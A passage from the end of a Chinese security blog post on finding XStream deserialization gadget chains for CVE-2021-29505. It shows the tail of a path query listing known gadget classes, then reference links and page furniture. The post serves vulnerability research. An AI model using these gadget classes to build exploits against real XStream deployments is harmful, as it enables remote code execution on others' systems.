&quot;sun.swing.SwingLazyValue&quot;, &quot;com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl&quot;, &quot;com.sun.jndi.rmi.registry.BindingEnumeration&quot;, &quot;sun.rmi.registry.RegistryImpl_Stub&quot;, &quot;com.sun.jndi.cosnaming.CNBindingEnumeration&quot;, &quot;com.sun.jndi.toolkit.dir.HierMemDirCtx$FlatBindings&quot;, &quot;com.sun.jndi.ldap.LdapReferralException&quot;])<br>return source, path limit 50<br></code></pre></td></tr></table></figure>
<h5 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h5><ol>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/278188.html">https://www.freebuf.com/vuls/278188.html</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.0kami.cn/blog/2021/how_to_find_gadget_chains_2/">https://blog.0kami.cn/blog/2021/how_to_find_gadget_chains_2/</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.0kami.cn/blog/2021/how_to_find_gadget_chains/">https://blog.0kami.cn/blog/2021/how_to_find_gadget_chains/</a></li>
<li><a target="_blank" rel="noopener" href="https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E6%B5%8B%E8%AF%95%E5%AF%B9%E8%B1%A1/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/web%E7%BB%84%E4%BB%B6/XStream/CVE-2021-29505/XStream-CVE-2021-29505-poc%E4%BF%AE%E6%AD%A3.html">https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E6%B5%8B%E8%AF%95%E5%AF%B9%E8%B1%A1/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/web%E7%BB%84%E4%BB%B6/XStream/CVE-2021-29505/XStream-CVE-2021-29505-poc%E4%BF%AE%E6%AD%A3.html</a></li>
</ol>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2022/11/11/21%E5%B9%B4%E7%BE%8E%E4%BA%9A%E6%9D%AF%E5%9B%A2%E4%BD%93%E8%B5%9B%E5%A4%8D%E7%8E%B0/">← 下一篇 21年美亚杯电子数据取证团队赛复现</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2022/11/06/2022%E9%95%BF%E5%AE%89%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%8D%E7%9B%98/">22年长安杯电子数据取证复盘 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">RacerZ</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/RacerZ-fighting"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" href="qiyizhang2002@foxmail.com"><i class="fa fa-envelope" alt="E-Mail"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">写在前面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8EXStream-1-4-16-CVE-2021-29505%E7%9A%84%E6%8E%A2%E7%B4%A2"><span class="toc-number">2.</span> <span class="toc-text">基于XStream-1.4.16 CVE-2021-29505的探索</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XStream-1-4-17%E9%99%90%E5%88%B6"><span class="toc-number">3.</span> <span class="toc-text">XStream 1.4.17限制</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">3.1.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>